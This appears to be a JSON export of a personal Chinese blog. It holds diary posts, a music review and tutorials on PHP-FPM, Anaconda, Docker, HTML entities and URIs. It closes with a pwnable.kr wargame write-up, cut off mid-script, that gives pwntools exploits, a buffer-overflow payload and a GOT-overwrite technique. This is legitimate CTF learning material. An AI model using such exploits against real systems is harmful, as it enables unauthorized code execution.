[{"title":"尾巴","date":"2018-12-30T11:22:09.000Z","path":"posts/tail/","text":"完成了这个阶段想做的事，写个小日记。 前几天发布了 cyris.moe 的第一个正式版本，这也是自己方向确定后的第一个作品，是一个礼物。一直想写这么一个网站，她有可爱的动画，独特的主题，我喜欢的颜色… 所有材料都是自己用 Ai 画的，所有代码都是自己写的，在 push 的一瞬间，看到她从 localhost 变为正式的域名，开心得…（我无法描述我的快乐。） 在编写「 绿生 」的过程中，我也对 (S)CSS 、框架、兼容性等等知识点有了更多的认识，我不擅长背东西，也不喜欢，但是每当自己尝试起每个写法，在浏览器上观察样式的变化时，我变得兴奋无比，毫无疲劳感。也许这正是适合我的学习方法：试一试。 按照下个阶段的计划我会设计编写一套博客主题，但是还没有找到合适的生成器。我尝试过自己用 PHP 写，尝试过 VuePress，尝试过 Hugo，Hexo 等等等等，都没有自己特别喜欢的，现在的博客还是基于 Hexo 的，因为自己写作的频率也不高，文章不多，技术类的知识点也都整理在作业部落上（但是少了点归属感），而且我十分喜欢 Art Chen 设计的这一款主题。假如我找到了合适的工具，重新编写了博客，这个博客的仓库依旧会保留，每一条 commit 都是我大学时光的见证。（回想起来我还在学习安全的时候，搭起第一个博客的时候，就不断地在折腾博客主题… 尽管没有懂太多前端知识，竟然很轻松地看懂了代码并改成了自己喜欢的样式，甚至加了些别的功能。） 转眼大三快结束了，也稍微总结下这段时光吧w。 我的前半段大学生活还是非常迷茫的，大一的时候加入了校艺术团和 Vidar-Team（伪），寒假里的 hgame 打得很开心，在高中时期我是不熬夜的，但是那个寒假我却每晚玩得很迟。成绩不算特别好，不上不下刚好是获奖选手里的最后一个，但却是我产生思考的一个时期。 后来开始分方向，因为我的寝室环境挺好，所以一直在自己的寝室学习，很少去协会，这直接导致了我跟大家的熟悉度没有那么高。周围的人都被学长叫走入群，但是没什么人记得我。后来有个晚上找 Ak 学长聊了聊（自学终究和单刷一样，存在一定的局限性呀 qwq），清晰了一点方向，然后迷迷糊糊地被学长拉进了群，开始下个阶段的学习。Flask 写了一半弃了，有自己不安定的原因，也有不喜欢这个框架的原因，再之后做了些 CTF 的练习，奇怪的是我的热情并没有那个寒假时那么高（现在想想也许是因为不是真爱吧2333），再后来又是很长一段时间的迷茫期，写 Java，学二进制，照着v爷爷的博客学 Pwn… 但都不是自己满意的。后来阴差阳错地给协会设计了会服，可能是大部分人认识自己的时候吧。看到大家很喜欢的样子很开心，但依旧不是能当作我的理想职业发展的东西。刷 GitHub 的时候看到了一个神奇的网站，然后开始关注 yui540，第一次知道网站还可以这么玩，内心还可以这样表达，我对“这样的技术”很有兴趣，然后没日没夜地学习 JavaScript，学习 CSS，学习各种能帮我实现这个网站的技术。再后来逐渐确定了自己的方向，对自己的未来也更加地清晰了起来。能清楚自己需要去做什么是件很幸运，很幸福的事情，至少对于我来说是这样，因为当自己离离开校园的日子越近，迷茫带给我的刺激越为强烈。 期间还有很多在合唱队的故事，但是我在大一下就退出了。老师很好，认识了许多很棒的朋友，最后几个人的阿卡贝拉获得了省一等奖，这不仅是那段时间练习的回馈，还实现了我的一个愿望。明天会带着水母去看元旦晚会，从前我在台上你在台下，这次我想陪你看看，做个观众w。 抓着 18 年的尾巴写了篇尾巴。 今天也下雪了，羽绒服真暖和！ Always Look Forward.","tags":[{"name":"煮字","slug":"煮字","permalink":"https://cyris.pen.moe/tags/煮字/"}]},{"title":"无事二三言","date":"2018-09-19T10:42:06.000Z","path":"posts/2018-09-16/","text":"今天似乎比较懒，没有什么特别想做的事，就来更一下博吧w。 回顾一下上周末，过了一个挺充实的生日。这两年特意改成了按阳历过，于是日期也随机了起来，也许会在某个工作日，也许是在周末，觉得这也是一种乐趣啦，毕竟以往都是铁定的节假日，少了很多与其他人接触的机会。趁着这股劲把主页重新写了一下，设计地很简洁（其实是水平不够还写不出很复杂的东西orzz），赶在凌晨急急忙忙地推了上去，还有一堆适配工作没做，之后慢慢修吧ww。最近在玩第五人格，小猫送了套很漂亮的皮肤，超喜欢！也收到了很多祝福，有来自很久没联系的人的，也有来自很要好的朋友的，对于一个有点内向又不善交际的人来说，已经非常开心了。当天和小猫去吃了一顿海底捞，番茄锅底与虾滑都很棒，不得不说海底捞的服务真得很到位，后厨还去买了一块蓝莓蛋糕作生日祝福，蛋糕附近铺满了很多石榴，这也是第一次发现蓝莓蛋糕原来那么好吃😋。晚上因为来了台风下了场异常大的雨，好在商场出口离接送点很近，在伞被吹歪前成功上车！ 两三年过得很快，前不久有位旧友来询问球场的事，才发觉是有很长一段时间没有接触了，就像一场乱纪元，沙漏还是在转的，但是不规律的太阳升起时还是会道声感叹。好在自己没有一成不变，在意识到这点时，它也成了一份很棒的礼物。 依然记得那天的一个小想法，回过头去看还挺可爱的：“今天困意不浓，也许是即将降世所带来的欣喜吧”。希望长大对我而言，是可以做更多想做的事，而不是被迫做更多不想做的事。说到想做的事，最近比较沉迷前端的一些东西，其实从很小的时候开始就有想要做出很棒的页面的想法，觉得能早点进入开发环境就好了TUT。 初步打算每年学习一样新的技能，一想新的东西有很多啊，想学日语想学摄影想学画画想学料理….不过思而不学则殆，还是从容易接触到的东西开始吧。 曾经想过要保持一定的更文频率，留下一点东西，后来断断续续的有很长一段时间没有写了，自己本身还是喜欢写作的，也许是因为接触到的有意思的东西不多，流不出墨了，不过最近还是有挺多进步的呀。 全家桶更新到了 iOS 12，觉得我大 6s 还能再战几年（笑）。倒是非常想入一块 iPad Pro 了，原来画画的需求并不是很大，现在觉得还是缺点方便设计的工具。 就谈这些吧～","tags":[{"name":"煮字","slug":"煮字","permalink":"https://cyris.pen.moe/tags/煮字/"}]},{"title":"先生的猫","date":"2018-08-16T15:43:02.000Z","path":"posts/magpie-festival/","text":"我会把心里话写在纸上， 塞进瓶子里， 让它在夜色里流淌； 总觉得你会像清晨的天色一样亮堂起来， 而那些心里话便随着亮起的波纹推向你的心间。 七夕快乐。","tags":[{"name":"煮字","slug":"煮字","permalink":"https://cyris.pen.moe/tags/煮字/"}]},{"title":"大千世界","date":"2018-06-19T01:26:31.000Z","path":"posts/大千世界/","text":"追的是幻想还是真理，大千世界，体悟万千；而自己正在不同描述，关于，学习一个现实。 聊聊许嵩的《大千世界》。 在儿童节那天或多或少地看到过这首歌的名字，在知乎，在网易云推荐。又过了几天看到了朋友的分享，就加入了收听列表。起初是被这种长久没有听过的布鲁斯风所吸引，昨天看了他的 MV ，感觉有很多可以玩味的地方。 “大千世界”一词出自《景德传灯录》，指广大无边的人世，MV 中标题的字体很有东方的味道，大红洒脱，之后也有主人公在一栋建筑里打坐的镜头，东西方元素的结合意外得和谐。 故事线很清晰，讲述了一场解救之旅。谈几个吸引到自己的地方： 一、音乐与展现对，在没看 MV 之前，在没有看网友的词意解析之前，光是看歌词我其实没太弄懂这首曲子在讲什么，孔雀、清泉、大到滑稽的 T 恤，怎么样都很难直接联系起来。在看完 MV 以后，那些一闪而过的战争镜头，黑人小女孩，让我想到了“战争”、“儿童”、“种族”这些词，方去搜索了一番。 音乐方面，开篇是一段重复的布鲁斯旋律，带点失真，这是一开始抓住我的地方；在某些段落中则对人声进行了颤抖处理，一开始听有点奇怪，但之后觉得这是不可缺少的部分，颤抖对那种“迷幻而深沉”的展现有很大的帮助，尤其是在和 MV 一起食用的时候，在了解到曲意之后。 片子中用了很多富有张力的描述方法。纽约街头建筑的扭曲变形，镜头的拉长压平，丰富的颜色展现，很有《奇异博士》里部分场景的感觉。女孩的清瞳里能看到大千世界，最后主人公手里的棒棒糖逐渐变为星球也有一种视觉冲击，而在最后，它变为了一颗炽热的太阳般的球体，印上与开篇同款的“大千世界”字样，让东方元素在西方曲调中自然地游走。 二、精心设计的细节穿插在纽约建筑中的各种英文语句，有许多是关于“现实／幻想“； 荧幕中的内容变化：小女孩 -&gt; 孔雀（2017 年 2 月 26 日，在瑞士日内瓦联合国万国宫，一只孔雀落在正举行叙利亚和谈的建筑门上）； 六一儿童节发的这首歌，很合适（“六一儿童节”是为了悼念 1942 年 6 月 10 日的利迪策惨案和全世界所有在战争中死难的儿童，反对虐杀和毒害儿童，以及保障儿童权利所成立的）； 也有网友说曲长也是一个细节，不知道是巧合还是故意设置的； 这首歌的每一句词。 —– 小收尾 —– 从初三以后就很少听许嵩的作品了，过了好多年，期间没有听到过什么大消息，也许是自己不太关注的原因，但是到现在还能见到这样的作品，超级开心 der，是真的用心在做音乐。 分享给你。","tags":[{"name":"煮字","slug":"煮字","permalink":"https://cyris.pen.moe/tags/煮字/"}]},{"title":"域名更换","date":"2018-06-16T03:12:15.000Z","path":"posts/2018-6-16/","text":"换域名啦，blog.cyris.cn -&gt; cyris.pen.moe。 交了一堆 deadline，心情舒畅，忙里偷闲一下。 新购了个 .moe 的域名，虽然之前用的 .cn 没什么问题，价格也还算友善，但还是更喜欢个性点的东西；邮箱则继续使用腾讯的域名邮箱，毕竟 TIM 每天都在用，更方便点。不过换成了企业版的邮箱，普通域名邮箱似乎现在不支持 .moe 了…","tags":[{"name":"煮字","slug":"煮字","permalink":"https://cyris.pen.moe/tags/煮字/"}]},{"title":"浅谈 PHP-FPM","date":"2018-05-06T11:20:00.000Z","path":"posts/php-fpm/","text":"关于 FPM ，FastCGI ，CGI 之间的关系与区别。 一、概述什么是 FPM ？ FPM 的全称是 FastCGI Process Manager ，即 PHP FastCGI 运行模式的一个进程管理器，从定义就可以看出它的核心功能是进程管理，那它用来管理什么进程呢，这个 FastCGI 又是什么东西，和 CGI 又有什么样的关系呢？ 二、从 CGI 说起先来看一段维基百科上的描述： 通用网关接口（Common Gateway Interface/CGI）是一种重要的互联网技术，可以让一个客户端，从网页浏览器向执行在网络服务器上的程序请求数据。CGI描述了服务器和请求处理程序之间传输数据的一种标准。 CGI 是一种协议，用来保证 Web server 传递过来的数据是标准格式，以方便 CGI 程序的运行。而 Web server（例如 Nginx）承担的工作则是内容的分发，比如你要请求 /index.html，Web server 就会去文件系统中寻找这个文件，然后发送给浏览器，此时它分发的是静态资源。 PHP 是一个脚本解析器，在网络应用场景下并没有实现 HTTP 网络库，而是实现了对 CGI／FastCGI 这样的协议的解析，然后与 Web 服务器配合实现了 HTTP 的处理。 比如我们请求一个 /index.php ，根据配置，Web server 判断这是个动态资源，然后寻找 PHP 解析器进行处理。当收到一个匹配 URL 的请求时，相应的程序就会被调用，例如 PHP 解析器会解析 php.ini 文件然后初始化执行环境，并将客户端发送的数据（URL、查询的数据、HTTP header 等）作为输入，经过处理之后（比如定义的一些函数功能），程序的输出会被 Web 服务器收集，并加上合适的档头返回给客户端。 三、FastCGI 的诞生现在我们知道 CGI 只是一种协议，而 FastCGI 则是一种优化了 CGI 的协议。优化的地方，就在刚刚提到的 PHP 解析器解析 php.ini 文件并初始化执行环境 这部分。标准的 CGI 程序对每个请求都会执行这些操作，如果用户还要再次请求动态资源，Web 服务器将重新 fork 一个新的进程，这显然是一种很低效的做法，尤其是在高负载下，操作系统创建和销毁进程的开销将十分巨大。 FastCGI 不是为每一个请求创建进程，而是通过 master-worker 这样的模型，使用持久化进程来处理请求。即在服务器启动时便创建 master 与 一定数量的 worker，在请求到来时 master 可以持续分配 worker 去处理请求。FastCGI 会维护一个进程池，根据资源与请求状况调整 worker 数量以节省资源，提高性能。 四、FPM 的实现从 PHP54 开始，PHP 官方加入了 FPM 来管理 FastCGI 的进程。注意，在这之后 PHP-FPM 与 PHP-CGI 没有任何关系。PHP-FPM 是对 FastCGI 的具体实现，而 PHP-CGI 只是个 CGI 程序，并不会管理进程。 简单来说，FPM 的实现就是创建一个 master 进程，在 master 进程中创建并监听 socket，然后 fork 出多个子进程，这些子进程各自接受请求。子进程的处理非常简单，它在启动后阻塞在 accept 上，有请求到达后开始读取请求数据，读取完成后开始处理然后再返回，在这期间是不会接收其它请求的，也就是说 FPM 的子进程同时只能响应一个请求，只有把这个请求处理完成后才会 accept 下一个请求。 FPM 的 master 进程与 worker 进程之间不会直接进行通信，master 通过共享内存获取 worker 进程的信息，比如 worker 进程当前状态、已处理请求数等，当 master 进程要 kill 一个 worker 进程时则通过发送信号的方式通知 worker 进程。 FPM 可以同时监听多个端口，每个端口对应一个 worker pool，而每个 pool 下对应多个 worker 进程，类似 Nginx 中 Server 的概念。 我们在配合 Nginx 的使用的时候，常常会遇到 502 的错误，这是因为没有可用的进程了，就返回了错误。如果是 worker 进程处理请求超时，则返回 504 错误。 关于 FPM 的详细实现可以参考 PHP7 内核剖析 - fpm 这篇文章。","tags":[{"name":"PHP","slug":"PHP","permalink":"https://cyris.pen.moe/tags/PHP/"},{"name":"FPM","slug":"FPM","permalink":"https://cyris.pen.moe/tags/FPM/"}]},{"title":"Anaconda 初体验","date":"2018-04-29T05:47:25.000Z","path":"posts/python-with-anaconda/","text":"Anaconda 是一个 Python 的发行版，包含了丰富的科学计算包，并有 Conda 这一工具进行包与环境的管理。 它的体积确实有点大，小容量选手可以考虑 Miniconda。 一、 安装 Anaconda下载地址：https://www.anaconda.com/download/ 以 macOS 为例，程序安装时它会在 ~/.bash_profile 写入 Path： 12# added by Anaconda3 5.1.0 installerexport PATH=\"/Users/cyris/anaconda3/bin:$PATH\" 如果用的是 zsh ，就在 .zshrc 中手动添加这条命令。 让配置生效： 1$ source .zshrc 查看配置是否生效： 1$ conda --version 二、 使用 Conda 进行环境管理Update Conda: 1$ conda update -n base conda 创建一个名为 venv 的环境，Python 版本指定为 2.7： 1$ conda create -n venv python=2.7 激活环境： 1$ source activate venv 退出当前环境： 1$ source deactivate 删除环境： 1$ conda remove -n venv --all 复制一个环境（已有一个名为 venv 的环境）： 1$ conda create -n venv-2 --clone venv 查看所有环境： 1$ conda info -e 可以简化一下命令，在 .zshrc 中添加一个别名：alias workon=&#39;source activate&#39;，就可以用 $ workon env-name 的方式激活环境了。 所有环境都会被安装在 /anaconda3/envs/ 目录下。 三、 Package 管理给某个特定环境安装 Package 有两种方式： 直接切换到那个环境中然后使用 conda install package-name 命令进行安装 在执行安装命令时添加 -n 参数来指定环境：conda install -n env-name package-name 查看已经安装的 Package：conda list （要查看指定环境中安装的包，同样在后面加上 -n 参数就好了。） 查找包： 1$ conda search package-name 更新包： 1$ conda update package-name 一些 conda 没有的包，可以使用 pip 安装。","tags":[{"name":"Python","slug":"Python","permalink":"https://cyris.pen.moe/tags/Python/"}]},{"title":"Vidar-Team 夏季会服设计","date":"2018-04-23T14:25:59.000Z","path":"posts/vidar-logo/","text":"咕了很久的会服上线啦，加入了点十周年纪念的元素 XD。 顺便整理了下美工材料：Vidar-Logo","tags":[{"name":"煮字","slug":"煮字","permalink":"https://cyris.pen.moe/tags/煮字/"}]},{"title":"利用 HTML 在 Markdown 中打出数学符号","date":"2018-03-28T04:03:56.000Z","path":"posts/markdown-tip/","text":"想要打出奇奇怪怪的符号 :D 1. 上标n2=n+1 n&lt;sup&gt;2&lt;/sup&gt;=n+1 2. 下标a=log2b a=log&lt;sub&gt;2&lt;/sub&gt;b 3. 注册商标hexo &reg; hexo &amp;reg; 4. function 符号&fnof;(x)=x+1 &amp;fnof;(x)=x+1 5. 根号&radic;2 （感觉不是很好看） &amp;radic;2 6. 角度符号30&deg; 30&amp;deg; 7. 一点小工作整理了一些比较常用的特殊符号的 HTML 编码： 符号 说明 编码 &times; 乘号 &amp;times; &divide; 除号 &amp;divide; &larr; 向左箭头 &amp;larr; &rarr; 向右箭头 &amp;rarr; &uarr; 向上箭头 &amp;uarr; &darr; 向下箭头 &amp;darr; &harr; 双向箭头 &amp;harr; &lArr; 双线向左箭头 &amp;lArr; &rArr; 双线向右箭头 &amp;rArr; &hArr; 双线双向箭头 &amp;hArr; &nbsp; 空格 &amp;nbsp; &plusmn; 正负符号 &amp;plusmn; &infin; 无限大符号 &amp;infin; &ang; 角度符号 &amp;ang; &int; 微积分符号 &amp;int; &iquest; 倒问号 &amp;iquest; &ne; 不等于符号 &amp;ne; &equiv; 相等符号 &amp;equiv; &le; 小于等于符号 &amp;le; &ge; 大于等于符号 &amp;ge; &para; 段落符号 &amp;para; &sect; 章节符号 &amp;sect; &perp; 垂直符号 &amp;perp; &copy; 版权所有符号 &amp;copy; &trade; 商标符号 &amp;trade; &reg; 注册商标符号 &amp;reg; &frac12; 二分之一符号 &amp;frac12; &permil; 百分符号 &amp;permil; &there4; 所以符号 &amp;there4; &pi; 圆周率符号 &amp;pi; &alpha; Alpha 符号 &amp;alpha; &beta; Bata 符号 &amp;beta; &gamma; Gamma 符号 &amp;gamma; &Delta; Delta 符号 &amp;Delta; &theta; Theta 符号 &amp;theta; &lambda; Lambda 符号 &amp;lambda; &Sigma; Sigma 符号 &amp;Sigma; &tau; Tau 符号 &amp;tau; 再记录一个异或符号：⊕ 参考文章： 如何在markdown中打出上标、下标和一些特殊符号","tags":[{"name":"Notebook","slug":"Notebook","permalink":"https://cyris.pen.moe/tags/Notebook/"}]},{"title":"利用 Dokcer 部署 PHP 开发环境","date":"2018-03-19T06:28:15.000Z","path":"posts/docker-php/","text":"利用 Docker 手动配置 PHP + Njinx + MySQL 开发环境。 手动配置的方法为：先拉取一个 ubuntu 镜像并创建相应的容器，在容器内部进行 PHP 相关环境部署。关于 docker 的说明以及具体的安装的方法请参考官方文档。 更新：一次 docker-compose 的实践：Ezdock 1. 安装 docker如果是在服务器端（以 ubuntu 为例），安装 docker 的基础操作有： 123sudo apt-get install -y docker.io #安装dockerservice docker start #启动dockerservice docker stop #关闭docker 简单说一下 image 与 container 的区别。前者为镜像，后者为容器，容器基于镜像，而我们平时用的 docker run 命令是从已有镜像中开启一个新的容器。 2. 拉取镜像docker 成功运行以后： 12sudo docker pull ubuntu #不指定版本，直接拉取一个 ubuntu 最新的 image ，如需指定版本可以用 ubuntu:16.04 的方式。 3. 创建测试容器现在我们已经有了一个 ubuntu 的镜像，接下来创建测试容器： 1234567sudo docker images #查看所有镜像sudo docker run -i -t --name=\"my_ubuntu\" image_id /bin/bash # 创建一个新的容器并运行，如果需要映射端口可以加上 -p 参数（如 -p 8083:80 ，前者为主机端口，后者为容器端口）。# -i: 以交互模式运行容器，通常与 -t 同时使用；# -t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；# --name=\"my_ubuntu\": 为容器指定一个名称；sudo docker ps #查看正在运行的容器 另外，当我们 exit 一个容器时，因为没有加 -d 参数，所以容器也会 stop ，如果需要再次进入可以先启动容器： 1docker start container_id 然后有两种方法重新进入交互状态，docker attach 与 docker exec -it 。用前者进入 container 时如果退出了容器，它依然会 stop ，而用后面的方式进入容器即使退出了交互界面 container 仍然会在后台运行。完整命令如下： 1docker exec -it container_id /bin/bash 4. 环境搭建现在我们已经进入了一个容器中，下面安装 PHP + Nginx + MySQL 的环境： 1234apt-get updateapt-get install nginxapt-get install mysql-serverapt-get install php 为了方便测试可以自行 apt-get install net-tools, vim, curl, unzip 等工具。 5. 传输写好的代码如果想要传输写好的代码到服务器上或者到 docker 中，有几条命令： 传输到服务器上（最好先打包为 zip ）： 1scp local_file remote_username@remote_ip:remote_path 传入 docker 容器中： 12345678将主机 /www/runoob 目录拷贝到容器 96f7f14e99ab 的 /www 目录下：docker cp /www/runoob 96f7f14e99ab:/www/将主机 /www/runoob 目录拷贝到容器 96f7f14e99ab 中，目录重命名为 www ：docker cp /www/runoob 96f7f14e99ab:/www将容器 96f7f14e99ab 的 /www 目录拷贝到主机的 /tmp 目录中：docker cp 96f7f14e99ab:/www /tmp/ 我们将代码解压至容器中 /var/www/html/ 目录下，但此时访问 php 会直接弹出下载而非解析，需要修改下 nginx 的配置文件，进入 /etc/nginx/sites-enabled/default ，修改 php 部分为： 123456location ~ \\.php$ &#123; fastcgi_pass unix:/run/php/php7.0-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name; include fastcgi_params; &#125; 重启下 nginx 就可以解析 php 了，其他的配置网上已经有很多的教程，这里就不多说了。 6. 几条服务重启命令123/etc/init.d/mysql restart/etc/init.d/nginx restart/etc/init.d/php7.0-fpm restart 参考文章： 从零学习Docker部署环境","tags":[{"name":"Notebook","slug":"Notebook","permalink":"https://cyris.pen.moe/tags/Notebook/"}]},{"title":"小谈 URI、URL 与 URN","date":"2018-03-18T08:37:08.000Z","path":"posts/url-talk/","text":"Talk about URL. 🐥 0x00 引言小科普帖。 我们一般对 URL 比较熟悉，但很少了解 URI 与 URN ，以及这三者之间的关系，先放一张它们的关系图： 0x01 概念三个名词的定义： URI (Uniform Resource Identifier) : 统一资源标识符。是一个用于标识某一互联网资源名称的字符串。 该种标识允许用户对网络中（一般指万维网）的资源通过特定的协议进行交互操作。 URL (Uniform Resource Locator) : 统一资源定位符（或称统一资源定位器/定位地址、URL 地址等）。有时也被俗称为网页地址（网址）。如同在网络上的门牌，是因特网上标准的资源的地址（Address）。 URN (Uniform Resource Name) : 统一资源名称，是统一资源标识（URI）的历史名字，它使用 urn: 作为 URI scheme。 简单地说，URI 可被视为定位符（URL），名称（URN）或两者兼备。 统一资源名（URN）如同一个人的名称，而统一资源定位符（URL）代表一个人的住址。换言之，URN 定义某事物的身份，而 URL 提供查找该事物的方法。如果觉得这样说有点绕，那我们来看看如何用一句话区分 URL 与 URI。 0x02 一句话区分 URL 与 URIURL 是 URI 的子集。 任何东西只要能够唯一地标识出来，都可以说这个标识是 URI 。如果这个标识还能获取到上述对象的路径，那么它同时还可以是一个 URL 。但是如果它不能提供获取到对象的路径，那么它必然不是 URL 。 即 URI 与 URL 都定义了 what the resource is，而 URL 还要包含 where (the resource is) 与 how (to get the resource) 。 0x03 栗子栗子比如现在有一个网站：https://cyris.cn/dir/filename.html 。 其中 dir/filename.html 就是一个 URI ，而整个链接就是一个 URL ，它包含了指定什么协议（https），在哪个站点（cyris.cn），去获取什么资源（dir/filename.html）。 正如上面所说，URI 只要是能唯一标识资源即可，而 URL 包括了 where，how，what 三者。","tags":[{"name":"Notebook","slug":"Notebook","permalink":"https://cyris.pen.moe/tags/Notebook/"}]},{"title":"pwnable.kr writeup","date":"2018-03-12T06:25:28.000Z","path":"posts/pwnable-kr/","text":"学习一下 Pwn 。 网址：http://pwnable.kr [Toddler’s Bottle]fd Mommy! what is a file descriptor in Linux? try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://www.youtube.com/watch?v=blAxTfcW9VU ssh fd@pwnable.kr -p2222 (pw:guest) 给出了源码 : 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf(\"pass argv[1] a number\\n\"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\"LETMEWIN\\n\", buf))&#123; printf(\"good job :)\\n\"); system(\"/bin/cat flag\"); exit(0); &#125; printf(\"learn about Linux file IO\\n\"); return 0;&#125; 查询一下 file descriptor ： Integer value Name &lt;unistd.h&gt; symbolic constant &lt;stdio.h&gt; file stream 0 Standard input STDIN_FILENO stdin 1 Standard output STDOUT_FILENO stdout 2 error STDERR_FILENO stderr 标准 io 中，read 函数的第一个参数需要为 0 （即标准输入），0x1234 转换为十进制为 4660 ，另外 buf 需要等于 “LETMEWIN\\n” ，poc 如下： 123456789from pwn import *pwn_ssh = ssh(host = 'pwnable.kr', user = 'fd', password = 'guest', port = 2222)print (pwn_ssh.connected())sh = pwn_ssh.process(argv = ['fd','4660'], executable = './fd')sh.sendline(\"LETMEWIN\")print (sh.recvall()) mommy! I think I know what a file descriptor is!! collision Daddy told me about cool MD5 hash collision today.I wanna do something like that too! ssh col@pwnable.kr -p2222 (pw:guest) 同样给出了源码： 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf(\"passcode length should be 20 bytes\\n\"); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system(\"/bin/cat flag\"); return 0; &#125; else printf(\"wrong passcode.\\n\"); return 0;&#125; check_password 函数把传入的数组中的数据（char 类型）转换为 int 类型后求和，总共有 5 个数，而一个 int 占四个字节，长度刚好为 20 bytes ，满足要求。 接着构造需要传入的数据。要使结果等于 0x21DD09EC ，可以先将 (568134124+1) / 5 = 113626825 。前四组数据为 113626825，第五组需要减个 1（即 113626824）。转换一下类型就是 ‘0x6c5cec9’ * 4 + ‘0x6c5cec8’ ，即 ‘\\x06\\xc5\\xce\\xc9’ * 4 + ‘\\x06\\xc5\\xce\\xc8’。 因为目标服务器使用的是小端序存储，最后需要把传入的字符反一下： 1./col `python -c \"print '\\xc9\\xce\\xc5\\x06' * 4 + '\\xc8\\xce\\xc5\\x06'\"` poc: 12345678from pwn import *pwn_ssh = ssh(host = 'pwnable.kr', user = 'col', password = 'guest', port = 2222)print (pwn_ssh.connected())data = '\\xc9\\xce\\xc5\\x06' * 4 + '\\xc8\\xce\\xc5\\x06'sh = pwn_ssh.process(argv = ['col', data], executable = './col')print (sh.recvall()) daddy! I just managed to create a hash collision :) bof Nana told me that buffer overflow is one of the most common software vulnerability.Is that true? Download : http://pwnable.kr/bin/bofDownload : http://pwnable.kr/bin/bof.c Running at : nc pwnable.kr 9000 bof.c : 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf(\"overflow me : \"); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system(\"/bin/sh\"); &#125; else&#123; printf(\"Nah..\\n\"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; 一道关于缓冲区溢出的题，需要通过 overflow 来覆盖 key 的值。 ida 载入后进入 func 函数： 可以找到 a1 的地址为 ebp+8h ，s 的地址为 ebp-2Ch，距离差 52，所以要覆盖 52 个字符。 12(python -c \"print 'A'*52 + '\\xbe\\xba\\xfe\\xca'\"; cat) | nc pwnable.kr 9000 # 同样需要注意后面的字符需要倒序传入；另外这里的 cat 既能让 nc 的 tcp 会话不结束（直到用户输入 Ctrl+C），又可以将用户输入的内容重定向给 nc。 exp: 123456from pwn import *pwn_socket = remote('pwnable.kr', 9000)pwn_socket.sendline('A' * 52 + '\\xbe\\xba\\xfe\\xca')pwn_socket.interactive() daddy, I just pwned a buFFer :) flag Papa brought me a packed present! let’s open it. Download : http://pwnable.kr/bin/flag This is reversing task. all you need is binary ida 载入后发现字符串：”This file is packed with the UPX”，那就用 upx 去解密 elf。 首先安装 upx : 1sudo apt-get install upx-ucl 之后执行命令解压 : 1upx -d flag 重新用 ida 载入后找到 flag ： 12.rodata:0000000000496628 aUpxSoundsLikeA db 'UPX...? sounds like a delivery service :)',0.rodata:0000000000496628 ; DATA XREF: .data:flag↓o UPX...? sounds like a delivery service :) passcode Mommy told me to make a passcode based login system.My initial C code was compiled without any error!Well, there was some compiler warning, but who cares about that? ssh passcode@pwnable.kr -p2222 (pw:guest) 源代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf(\"enter passcode1 : \"); scanf(\"%d\", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(\"enter passcode2 : \"); scanf(\"%d\", passcode2); printf(\"checking...\\n\"); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123; printf(\"Login OK!\\n\"); system(\"/bin/cat flag\"); &#125; else&#123; printf(\"Login Failed!\\n\"); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf(\"enter you name : \"); scanf(\"%100s\", name); printf(\"Welcome %s!\\n\", name);&#125;int main()&#123; printf(\"Toddler's Secure Login System 1.0 beta.\\n\"); welcome(); login(); // something after login... printf(\"Now I can safely trust you that you have credential :)\\n\"); return 0;&#125; login() 中两个 scanf 都没有取地址，这会导致程序使用两个 passcode 的值作为存储输入的地址，如果地址不可写就会造成程序内部错误。 这样就不能直接写入特定的 passcode 值了，思路是 GOT 表覆写。 由于 welcome() 和 login() 函数是连续调用的，导致它们有相同的地址，从下面这两段代码中也可以看出，它们都在 esp+18h 的位置： 1234567891011unsigned int welcome()&#123; char v1; // [esp+18h] [ebp-70h] unsigned int v2; // [esp+7Ch] [ebp-Ch] v2 = __readgsdword(0x14u); printf(\"enter you name : \"); __isoc99_scanf(\"%100s\", &amp;v1); printf(\"Welcome %s!\\n\", &amp;v1); return __readgsdword(0x14u) ^ v2;&#125; 12345678910111213141516171819int login()&#123; int v1; // [esp+18h] [ebp-10h] int v2; // [esp+1Ch] [ebp-Ch] printf(\"enter passcode1 : \"); __isoc99_scanf(\"%d\"); fflush(stdin); printf(\"enter passcode2 : \"); __isoc99_scanf(\"%d\"); puts(\"checking...\"); if ( v1 != 338150 || v2 != 13371337 ) &#123; puts(\"Login Failed!\"); exit(0); &#125; puts(\"Login OK!\"); return system(\"/bin/cat flag\");&#125; 这样 name 和 passcode1 就存在于相同的栈空间了。name 的地址为 ebp-70h ，passcode1 的地址为 ebp-10h ，两者相距 96 个字节，有 4 个字节的任意地址写。我们可以把 passcode1 覆盖为 fflush 的地址，然后利用 scanf 把 system 的地址写过去，这样等执行 fflush 时就能执行 system 了（即把 fflush 的 GOT 表值改为 080485E3 ）。 system 的地址： 12.text:080485E3 mov dword ptr [esp], offset command ; \"/bin/cat flag\".text:080485EA call _system poc: 12345678910111213from pwn import *context.log_level = 'debug'context.terminal = ['terminator','-x','bash','-c']bin = 